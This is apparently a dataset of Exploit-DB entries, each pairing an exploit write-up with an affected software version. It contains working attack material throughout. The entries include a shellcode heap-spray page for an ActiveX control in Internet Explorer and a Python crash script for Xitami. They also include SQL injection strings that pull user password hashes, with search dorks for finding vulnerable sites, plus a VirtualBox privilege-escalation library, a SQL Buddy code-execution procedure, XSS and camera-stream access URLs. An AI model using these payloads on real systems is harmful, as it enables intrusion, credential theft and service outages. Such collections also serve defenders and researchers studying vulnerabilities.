14519,"Barcodewiz Barcode ActiveX Control 3.29 - Remote HeapSpray (Internet Explorer 6/7) <!-- Title:		Barcodewiz 3.29 ActiveX Heap Spray Exploit Coded By:	Dr_IDE Found By:	loneferret Tested:		Windows XP SP3 on IE6 + IE7 Date:		July, 30 2010 --> <html> <object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='target'></object> <script language='javascript'>  // Payload is win32_exec -  calc.exe    shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+                       '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+                       '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+                       '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+                       '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+                       '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+                       '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+                       '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');    nops=unescape('%u9090%u9090');   headersize = 69;  //size adjusted for IE6/IE7 ""universality"" slackspace= headersize + shellcode.length; while(nops.length<slackspace) nops+=nops; fillblock=nops.substring(0,slackspace); block=nops.substring(0,nops.length-slackspace); while(block.length+slackspace<0x40000) block=block+block+fillblock; memory=new Array(); for( counter=0; counter<250; counter++) memory[counter]= block + shellcode;   ret=''; for( counter=0; counter<=1000; counter++) ret+=unescape(""%0a%0a%0a%0a"");    target.LoadProperties(ret); </script> </html>",['3.29'],1
42389,"SoundTouch 1.9.2 - Multiple Vulnerabilities SoundTouch multiple vulnerabilities ================ Author : qflb.wu ===============   Introduction: ============= SoundTouch is an open-source audio processing library for changing the Tempo, Pitch and Playback Rates of audio streams or audio files. The library additionally supports estimating stable beats-per-minute rates for audio tracks.   Affected version: ===== 1.9.2   Vulnerability Description: ========================== 1. the TDStretch::processSamples function in source/SoundTouch/TDStretch.cpp in SoundTouch 1.9.2 can cause a denial of service(infinite loop and CPU consumption) via a crafted wav file.   ./soundstretch SoundTouch_1.9.2_infinite_loop.wav out   POC: SoundTouch_1.9.2_infinite_loop.wav CVE: CVE-2017-9258   2. the TDStretch::acceptNewOverlapLength function in source/SoundTouch/TDStretch.cpp in SoundTouch 1.9.2 can cause a denial of service(memory allocation error and application crash) via a crafted wav file.   ./soundstretch SoundTouch_1.9.2_memory_allocation_error.wav out   ==87485==ERROR: AddressSanitizer failed to allocate 0x16103e000 (5922611200) bytes of LargeMmapAllocator: 12 ==87485==Process memory map follows: 0x000000400000-0x0000004c7000/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch 0x0000006c7000-0x0000006c8000/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch 0x0000006c8000-0x0000006ca000/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch 0x0000006ca000-0x000001b0e000 0x00007fff7000-0x00008fff7000 0x00008fff7000-0x02008fff7000 0x02008fff7000-0x10007fff8000 0x600000000000-0x603000000000 0x603000000000-0x603000010000 0x603000010000-0x604000000000 0x604000000000-0x604000010000 0x604000010000-0x608000000000 0x608000000000-0x608000010000 0x608000010000-0x60b000000000 0x60b000000000-0x60b000010000 0x60b000010000-0x60e000000000 0x60e000000000-0x60e000010000 0x60e000010000-0x611000000000 0x611000000000-0x611000010000 0x611000010000-0x615000000000 0x615000000000-0x615000020000 0x615000020000-0x616000000000 0x616000000000-0x616000020000 0x616000020000-0x619000000000 0x619000000000-0x619000020000 0x619000020000-0x61e000000000 0x61e000000000-0x61e000020000 0x61e000020000-0x621000000000 0x621000000000-0x621000020000 0x621000020000-0x624000000000 0x624000000000-0x624000020000 0x624000020000-0x640000000000 0x640000000000-0x640000003000 0x7fdf6b253000-0x7fdf6d756000 0x7fdf6d756000-0x7fdf6d914000/lib/x86_64-linux-gnu/libc-2.19.so 0x7fdf6d914000-0x7fdf6db13000/lib/x86_64-linux-gnu/libc-2.19.so 0x7fdf6db13000-0x7fdf6db17000/lib/x86_64-linux-gnu/libc-2.19.so 0x7fdf6db17000-0x7fdf6db19000/lib/x86_64-linux-gnu/libc-2.19.so 0x7fdf6db19000-0x7fdf6db1e000 0x7fdf6db1e000-0x7fdf6db34000/lib/x86_64-linux-gnu/libgcc_s.so.1 0x7fdf6db34000-0x7fdf6dd33000/lib/x86_64-linux-gnu/libgcc_s.so.1 0x7fdf6dd33000-0x7fdf6dd34000/lib/x86_64-linux-gnu/libgcc_s.so.1 0x7fdf6dd34000-0x7fdf6de1a000/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.19 0x7fdf6de1a000-0x7fdf6e019000/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.19 0x7fdf6e019000-0x7fdf6e021000/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.19 0x7fdf6e021000-0x7fdf6e023000/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.19 0x7fdf6e023000-0x7fdf6e038000 0x7fdf6e038000-0x7fdf6e03b000/lib/x86_64-linux-gnu/libdl-2.19.so 0x7fdf6e03b000-0x7fdf6e23a000/lib/x86_64-linux-gnu/libdl-2.19.so 0x7fdf6e23a000-0x7fdf6e23b000/lib/x86_64-linux-gnu/libdl-2.19.so 0x7fdf6e23b000-0x7fdf6e23c000/lib/x86_64-linux-gnu/libdl-2.19.so 0x7fdf6e23c000-0x7fdf6e243000/lib/x86_64-linux-gnu/librt-2.19.so 0x7fdf6e243000-0x7fdf6e442000/lib/x86_64-linux-gnu/librt-2.19.so 0x7fdf6e442000-0x7fdf6e443000/lib/x86_64-linux-gnu/librt-2.19.so 0x7fdf6e443000-0x7fdf6e444000/lib/x86_64-linux-gnu/librt-2.19.so 0x7fdf6e444000-0x7fdf6e45d000/lib/x86_64-linux-gnu/libpthread-2.19.so 0x7fdf6e45d000-0x7fdf6e65c000/lib/x86_64-linux-gnu/libpthread-2.19.so 0x7fdf6e65c000-0x7fdf6e65d000/lib/x86_64-linux-gnu/libpthread-2.19.so 0x7fdf6e65d000-0x7fdf6e65e000/lib/x86_64-linux-gnu/libpthread-2.19.so 0x7fdf6e65e000-0x7fdf6e662000 0x7fdf6e662000-0x7fdf6e767000/lib/x86_64-linux-gnu/libm-2.19.so 0x7fdf6e767000-0x7fdf6e966000/lib/x86_64-linux-gnu/libm-2.19.so 0x7fdf6e966000-0x7fdf6e967000/lib/x86_64-linux-gnu/libm-2.19.so 0x7fdf6e967000-0x7fdf6e968000/lib/x86_64-linux-gnu/libm-2.19.so 0x7fdf6e968000-0x7fdf6e9bd000/usr/local/lib/libSoundTouch.so.1.0.0 0x7fdf6e9bd000-0x7fdf6ebbd000/usr/local/lib/libSoundTouch.so.1.0.0 0x7fdf6ebbd000-0x7fdf6ebbe000/usr/local/lib/libSoundTouch.so.1.0.0 0x7fdf6ebbe000-0x7fdf6ebc1000/usr/local/lib/libSoundTouch.so.1.0.0 0x7fdf6ebc1000-0x7fdf6ebe4000/lib/x86_64-linux-gnu/ld-2.19.so 0x7fdf6edb1000-0x7fdf6edc8000 0x7fdf6edca000-0x7fdf6edd7000 0x7fdf6edda000-0x7fdf6ede3000 0x7fdf6ede3000-0x7fdf6ede4000/lib/x86_64-linux-gnu/ld-2.19.so 0x7fdf6ede4000-0x7fdf6ede5000/lib/x86_64-linux-gnu/ld-2.19.so 0x7fdf6ede5000-0x7fdf6ede6000 0x7ffcb0503000-0x7ffcb0524000[stack] 0x7ffcb05a4000-0x7ffcb05a6000[vvar] 0x7ffcb05a6000-0x7ffcb05a8000[vdso] 0xffffffffff600000-0xffffffffff601000[vsyscall] ==87485==End of process memory map. ==87485==AddressSanitizer CHECK failed: /build/buildd/llvm-toolchain-3.4-3.4/projects/compiler-rt/lib/sanitizer_common/sanitizer_posix.cc:68 ""((""unable to mmap"" && 0)) != (0)"" (0x0, 0x0)     #0 0x46da6f in __asan::AsanCheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x46da6f)     #1 0x4732d1 in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x4732d1)     #2 0x477b9e in __sanitizer::MmapOrDie(unsigned long, char const*) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x477b9e)     #3 0x433278 in __sanitizer::LargeMmapAllocator<__asan::AsanMapUnmapCallback>::Allocate(__sanitizer::AllocatorStats*, unsigned long, unsigned long) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x433278)     #4 0x42f2bb in __asan::Allocate(unsigned long, unsigned long, __sanitizer::StackTrace*, __asan::AllocType, bool) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x42f2bb)     #5 0x46824d in operator new[](unsigned long) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x46824d)     #6 0x7fdf6e993d8e in soundtouch::TDStretch::acceptNewOverlapLength(int) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:724     #7 0x7fdf6e993d8e in soundtouch::TDStretch::calculateOverlapLength(int) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:1008     #8 0x7fdf6e9901f0 in soundtouch::TDStretch::setParameters(int, int, int, int) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:158     #9 0x7fdf6e998910 in soundtouch::TDStretch::setChannels(int) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:599     #10 0x47f825 in setup(soundtouch::SoundTouch*, WavInFile const*, RunParameters const*) /home/a/Downloads/soundtouch/source/SoundStretch/main.cpp:127     #11 0x47f825 in main /home/a/Downloads/soundtouch/source/SoundStretch/main.cpp:310     #12 0x7fdf6d777f44 (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)     #13 0x47dbac in _start (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x47dbac)    POC:  SoundTouch_1.9.2_infinite_loop.wav  CVE:  CVE-2017-9259    3.  the TDStretchSSE::calcCrossCorr function in source/SoundTouch/sse_optimized.cpp in SoundTouch 1.9.2 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted wav file.   ./soundstretch SoundTouch_1.9.2_heap_buffer_overflow.wav out   ==87598==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x625000007110 at pc 0x7f5076e3c3dc bp 0x7ffda7a42e10 sp 0x7ffda7a42e08 READ of size 16 at 0x625000007110 thread T0     #0 0x7f5076e3c3db in soundtouch::TDStretchSSE::calcCrossCorr(float const*, float const*, double&) /home/a/Downloads/soundtouch/source/SoundTouch/sse_optimized.cpp:120:35     #1 0x7f5076e1f0f9 in soundtouch::TDStretch::seekBestOverlapPositionFull(float const*) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:305     #2 0x7f5076e1ee2c in soundtouch::TDStretch::seekBestOverlapPosition(float const*) /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:258     #3 0x7f5076e21e88 in soundtouch::TDStretch::processSamples() /home/a/Downloads/soundtouch/source/SoundTouch/TDStretch.cpp:659     #4 0x7f5076e12893 in soundtouch::FIFOSamplePipe::moveSamples(soundtouch::FIFOSamplePipe&) /home/a/Downloads/soundtouch/source/SoundTouch/../../include/FIFOSamplePipe.h:88     #5 0x7f5076e12893 in soundtouch::SoundTouch::putSamples(float const*, unsigned int) /home/a/Downloads/soundtouch/source/SoundTouch/SoundTouch.cpp:334     #6 0x480f5e in process(soundtouch::SoundTouch*, WavInFile*, WavOutFile*) /home/a/Downloads/soundtouch/source/SoundStretch/main.cpp:200     #7 0x480f5e in main /home/a/Downloads/soundtouch/source/SoundStretch/main.cpp:314     #8 0x7f5075c00f44 (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)     #9 0x47dbac in _start (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x47dbac)   0x625000007110 is located 0 bytes to the right of 8208-byte region [0x625000005100,0x625000007110) allocated by thread T0 here:     #0 0x468209 in operator new[](unsigned long) (/home/a/Downloads/soundtouch/source/SoundStretch/.libs/soundstretch+0x468209)     #1 0x7f5076e055db in soundtouch::FIFOSampleBuffer::ensureCapacity(unsigned int) /home/a/Downloads/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:174   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/soundtouch/source/SoundTouch/sse_optimized.cpp:120 soundtouch::TDStretchSSE::calcCrossCorr(float const*, float const*, double&) Shadow bytes around the buggy address:   0x0c4a7fff8dd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c4a7fff8de0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c4a7fff8df0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c4a7fff8e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c4a7fff8e10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c4a7fff8e20: 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c4a7fff8e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c4a7fff8e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c4a7fff8e50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c4a7fff8e60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c4a7fff8e70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:     fa   Heap right redzone:    fb   Freed heap region:     fd   Stack left redzone:    f1   Stack mid redzone:     f2   Stack right redzone:   f3   Stack partial redzone: f4   Stack after return:    f5   Stack use after scope: f8   Global redzone:        f9   Global init order:     f6   Poisoned by user:      f7   ASan internal:         fe ==87598==ABORTING   POC: SoundTouch_1.9.2_heap_buffer_overflow.wav CVE: CVE-2017-9260   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42389.zip",['1.9.2'],1
41907,"Oracle VM VirtualBox 5.1.14 r112924 - Unprivileged Host User to Host Kernel Privilege Escalation via ALSA config /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1141  This is another way to escalate from an unprivileged userspace process into the VirtualBox process, which has an open file descriptor to the privileged device /dev/vboxdrv and can use that to compromise the host kernel.  The issue is that, for VMs with ALSA audio, the privileged VM host process loads libasound, which parses ALSA configuration files, including one at ~/.asoundrc. ALSA is not designed to run in a setuid context and therefore deliberately permits loading arbitrary shared libraries via dlopen().  To reproduce, on a normal Ubuntu desktop installation with VirtualBox installed, first configure a VM with ALSA audio, then (where ee347b44-b82d-41c2-b643-366cf297a37c is the ID of that VM):   ~$ cd /tmp /tmp$ cat > evil_vbox_lib.c */  #define _GNU_SOURCE  #include <string.h> #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <sys/prctl.h>  extern char *program_invocation_short_name;  __attribute__((constructor)) void run(void) { 	if (strcmp(program_invocation_short_name, ""VirtualBox"")) 		return;  	prctl(PR_SET_DUMPABLE, 1); 	printf(""running in pid %d\n"", getpid()); 	printf(""searching for vboxdrv file descriptor in current process...\n""); 	char linkbuf[1000]; 	char *needle = ""/dev/vboxdrv""; 	for (int i=0; i<1000; i++) { 		char linkpath[1000]; 		sprintf(linkpath, ""/proc/self/fd/%d"", i); 		ssize_t linklen = readlink(linkpath, linkbuf, sizeof(linkbuf)-1); 		if (linklen == -1) continue; 		if (linklen == strlen(needle) && memcmp(linkbuf, needle, strlen(needle)) == 0) { 			printf(""found it, fd %d is /dev/vboxdrv\n"", i); 		} 	} 	_exit(0); }  /* /tmp$ gcc -shared -o evil_vbox_lib.so evil_vbox_lib.c -fPIC -Wall -ldl -std=gnu99 /tmp$ cat > ~/.asoundrc hook_func.pulse_load_if_running {         lib ""/tmp/evil_vbox_lib.so""         func ""conf_pulse_hook_load_if_running"" } /tmp$ /usr/lib/virtualbox/VirtualBox --startvm ee347b44-b82d-41c2-b643-366cf297a37c running in pid 8910 searching for vboxdrv file descriptor in current process... found it, fd 7 is /dev/vboxdrv /tmp$ rm ~/.asoundrc   I believe that the ideal way to fix this would involve running libasound, together with other code that doesn't require elevated privileges - which would ideally be all userland code -, in an unprivileged process. However, for now, moving only the audio output handling into an unprivileged process might also do the job; I haven't yet checked whether there are more libraries VirtualBox loads that permit loading arbitrary libraries into the VirtualBox process.  You could probably theoretically also fix this by modifying libasound to suppress dangerous configuration directives in ~/.asoundrc, but I believe that that would be brittle and hard to maintain.  Tested on Ubuntu 14.04.5 with VirtualBox 5.1.14 r112924. */",['5.1.14 r112924'],1
27884,"Confixx 3.0/3.1 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17984/info  Confixx is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/ftplogin/?login="">[XSS]<div style=",['3.0/3.1'],1
35428,"SQL Buddy 1.3.3 - Remote Code Execution # Exploit Title: SQL Buddy Remote Code Execution # Date: November 29 2014 # Exploit Author: Fady Osman (@fady_osman) # Youtube Channel  : https://www.youtube.com/user/cutehack3r # Vendor Homepage: http://sqlbuddy.com/ # Software Link: https://github.com/calvinlough/sqlbuddy/raw/gh-pages/sqlbuddy.zip # Version: SQL Buddy 1.3.3 # Tested on: Kubuntu 14.10  SQLBuddy provides a web based mysql administration and it's included in packages like wamp server.  SQL Buddy suffers from a remote code execution. This happens due to the fact that it allows the user to login using any server he wants and that it allows the user to export data from the database to a file on the webserver.  In order to exploit this bug do the following steps:  1- Use a sql server you control and have a valid credentials for (You can use one of the free mysql hosting services). 2- Create a database and a table with one column of type text. 3- Insert the php code you want to execute into that table. 4- Choose the previously created table from the left menu. 5- Click Export from the top menu. 6- Choose CSV format. 7- Choose ""Text File"" and name the file with php extension for example shell.php.  The exported file will be at : sqlbuddy/exports/ assuming you installed sqlbuddy in a folder named sqlbuddy.  --   *Regards,* [image: Fady Osman on about.me]  Fady Osman about.me/Fady_Osman     <http://about.me/Fady_Osman>",['1.3.3'],1
20655,"Orange Software Orange Web Server 2.1 - Denial of Service source: https://www.securityfocus.com/bid/2432/info  A remote user can cause a denial-of-service condition in Orange Software Orange Web Server.  The attacker could submit a specially crafted GET request via a telnet connection to cause the server to crash.  A restart of the server is required to gain normal functionality.   echo ""GET A"" | telnet target",['2.1'],1
45537,"FLIR Thermal Traffic Cameras 1.01-0bb5b27 - RTSP Stream Disclosure # Exploit Title: FLIR Thermal Traffic Cameras 1.01-0bb5b27 - RTSP Stream Disclosure # Author: Gjoko 'LiquidWorm' Krstic # Date: 2018-10-06 # Vendor: https://www.flir.com # Link: https://www.flir.com/security/best-practices-for-cybersecurity/ # CVE: N/A # Tested on: nginx/1.12.1, nginx/1.10.2, nginx/1.8.0, Websocket/13 (RFC 6455)  # Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne #                           E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE #                           V1.02.P01     (TI x-stream)  Codename: TIIP2 #                           V1.05.P01     (ThermiCam)    Codename: ThermiCam #                           V1.04.P02     (ThermiCam)    Codename: ThermiCam #                           V1.04         (ThermiCam)    Codename: ThermiCam #                           V1.01.P02     (ThermiCam)    Codename: ThermiCam #                           V1.05.P03     (TrafiSense)   Codename: TrafiSense #                           V1.06         (VIP-IP)       Codename: VIP-IP #                           V1.02.P02     (TrafiRadar)   Codename: TrafiRadar  # Vendor patched firmware version: # # Product name                Firmware      Released  # ---------------------------------------------------- # ThermiCam / TrafiSense      E1.06.03      17.09.2018 # TI BPL2 EDGE                V1.00         17.09.2018 # TI x-stream                 E1.03.02      17.09.2018 # TrafiOne                    E1.02.02      17.09.2018 # ----------------------------------------------------  # Description # FLIR thermal traffic cameras suffer from an unauthenticated and unauthorized # live RTSP video stream access.  # Advisory ID: ZSL-2018-5489 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5489.php  # Simple PoC:  http://Target/live.mjpeg?id=1  rtsp://Target/mpeg4  http://Target/snapshot.jpg",['1.01-0bb5b27'],1
40849,"Xitami Web Server 5.0a0 - Denial of Service #!/usr/bin/env python # # # X5 Webserver 5.0 Remote Denial Of Service Exploit # # # Vendor: iMatrix # Product web page: http://www.xitami.com # Affected version: 5.0a0 # # Summary: X5 is the latest generation web server from iMatix Corporation. # The Xitami product line stretches back to 1996. X5 is built using iMatix's # current Base2 technology for multithreading applications. On multicore machines, # it is much more scalable than Xitami/2. # # Desc: The vulnerability is caused due to a NULL pointer dereference when processing # malicious HEAD and GET requests. This can be exploited to cause denial of service # scenario. # # ---------------------------------------------------------------------------- # # (12c0.164c): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # *** WARNING: Unable to verify checksum for C:\zslab\ws\64327\xitami-5.0a0-windows\xitami.exe # *** ERROR: Module load completed but symbols could not be loaded for C:\zslab\ws\64327\xitami-5.0a0-windows\xitami.exe # eax=0070904d ebx=03a91808 ecx=0070904d edx=00000000 esi=0478fef4 edi=0478fe8c # eip=00503ae0 esp=0478fb28 ebp=0478fb48 iopl=0         nv up ei pl zr na pe nc # cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246 # xitami+0x103ae0: # 00503ae0 8b02            mov     eax,dword ptr [edx]  ds:002b:00000000=???????? # 0:004> kb #  # ChildEBP RetAddr  Args to Child               # WARNING: Stack unwind information not available. Following frames may be wrong. # 00 0478fb48 00460ee6 0ace0840 04025ea0 0478fd78 xitami+0x103ae0 # 01 0478fe8c 0045f6fa 0ace0bd8 0478ff28 cccccccc xitami+0x60ee6 # 02 0478fee8 004c60a1 0478ff14 00000000 0478ff38 xitami+0x5f6fa # 03 0478ff28 004fdca3 03a90858 03a67e38 00000000 xitami+0xc60a1 # 04 0478ff40 00510293 03a90858 fc134d7d 00000000 xitami+0xfdca3 # 05 0478ff7c 00510234 00000000 0478ff94 7679338a xitami+0x110293 # 06 0478ff88 7679338a 03a91808 0478ffd4 77029902 xitami+0x110234 # 07 0478ff94 77029902 03a91808 7134bcc2 00000000 kernel32!BaseThreadInitThunk+0xe # 08 0478ffd4 770298d5 00510190 03a91808 00000000 ntdll!__RtlUserThreadStart+0x70 # 09 0478ffec 00000000 00510190 03a91808 00000000 ntdll!_RtlUserThreadStart+0x1b # # ---------------------------------------------------------------------------- # # Tested on: Microsoft Windows XP Professional SP3 (EN) #            Microsoft Windows 7 Ultimate SP1 (EN) # # # Vulnerability discovered by Stefan Petrushevski aka sm - <stefan@zeroscience.mk> # # # Advisory ID: ZSL-2016-5377 # Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5377.php # # # 15.11.2016 #   import sys, socket  if len(sys.argv) < 3: 	print '------- X5 Webserver 5.0a0 - Remote Denial of Service ------\n' 	print '\nUsage: ' + sys.argv[0] + ' <target> <port>\n' 	print 'Example: ' + sys.argv[0] + ' 8.8.8.8 80\n' 	print '------------------------------------------------------------\n' 	sys.exit(0)  host = sys.argv[1] port = int(sys.argv[2])  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((host, port)) s.settimeout(666) payload = ( '\x47\x45\x54\x20\x2f\x50\x52\x4e\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a' '\x48\x6f\x73\x74\x3a\x20\x31\x37\x32\x2e\x31\x39\x2e\x30\x2e\x32\x31\x35\x0d' '\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x5a\x53\x4c\x2d\x46\x75' '\x7a\x7a\x65\x72\x2d\x41\x67\x65\x6e\x74\x2f\x34\x2e\x30\x2e\x32\x38\x35\x20' '\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x78\x6d\x6c\x2c' '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x2c\x61\x70\x70' '\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c' '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x74\x65\x78' '\x74\x2f\x70\x6c\x61\x69\x6e\x3b\x71\x3d\x30\x2e\x38\x2c\x69\x6d\x61\x67\x65' '\x2f\x70\x6e\x67\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x41\x63\x63' '\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x75\x73' '\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45' '\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x64\x65\x66\x6c\x61' '\x74\x65\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x43\x68\x61\x72\x73\x65\x74\x3a' '\x20\x49\x53\x4f\x2d\x38\x38\x35\x39\x2d\x31\x2c\x75\x74\x66\x2d\x38\x3b\x71' '\x3d\x30\x2e\x37\x2c\x2a\x3b\x71\x3d\x30\x2e\x37\x0d\x0a\x4b\x65\x65\x70\x2d' '\x41\x6c\x69\x76\x65\x3a\x20\x33\x30\x30\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74' '\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65\x0d\x0a\x0d\x0a' )  s.send(payload) s.close print 'BOOM! \n'",['5.0a0'],1
15890,"Tech Shop Technote 7 - SQL Injection # Exploit Title: Technote7(Commercial Version, Free Version) <== SQL Injection  Vulnerabilities # Google Dork: inurl:/technote/board.php?category= # Date: 2011/01/02 # Author: MaJ3stY(http://maj3sty.tistory.com) # Language : PHP  # Software Link: http://www.technote.co.kr/php/technote1/board.php?board=consult&command=skin_insert&exe=insert_down_shop # Version: Technote7, TechShop 1.2(The latest version of the current from) # Tested on: All Windows, All Linux  PoC(Technote7) :    http://localhost/board.php?board=skinmarket&category=11 and 1=2 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@version,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61--  PoC(Technote7 - Techshop 1.2) :   http://localhost/board.php?board=agcmain&category=10 and 1=2 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@version,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71--  Exploit :  http://site/board.php?board=boarname&category=[SQL Line]",['7'],1
5076,"Mambo Component Sermon 0.2 - 'gid' SQL Injection ######################################################################### # # netadvantist@copyright 2006 SQL Injection(com_na_xxx) # ######################################################################### # # AUTHOR : S@BUN # # HOME : http://www.hackturkiye.com # ######################################################################### # # DORKS 1 : allinurl:""com_na_content"" # # DORK 2 : allinurl:""com_na_bible"" # # DORKS 3 : allinurl:""com_na_events"" # # DORKS 4 : allinurl:""com_na_content"" # # DORKS 5 : allinurl:""com_na_feedback"" # # DORKS 6 : allinurl:""com_na_mydocs"" # # DORKS 7 : allinurl:""com_na_churchmap"" # # DORKS 8 : allinurl:""com_na_bibleinfo"" # # DORKS 9 : allinurl:""com_na_dbs"" # # DORKS 10 : allinurl:""com_na_udm"" # # DORKS 11 : allinurl:""com_na_qforms"" # # DORKS 12 : allinurl:""com_na_gallery2"" # # DORKS 13 : allinurl:""com_na_publicrss"" # # DORKS 13 : allinurl:""index.php?kwd"" # ########################################################################## EXPLOÄ°T:  index.php?option=com_sermon&gid=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0,0,username,password%2C0%2C0%2C0/**/from/**/mos_users/*   ########################################################################## # S@BUN                      www.hackturkiye.com                     S@BUN ########################################################################## # S@BUN                        i AM NOT HACKER                      S@BUN ##########################################################################  side notes:  	<name>Sermon</name> 	<creationDate>12 JAN 2006</creationDate> 	<author>Isai Michel L.</author> 	<copyright>GNU/GPL</copyright> 	<authorEmail>isai@isaim.com</authorEmail>  	<authorUrl>www.isaim.com</authorUrl> 	<version>0.2</version>  # milw0rm.com [2008-02-07]",['0.2'],1
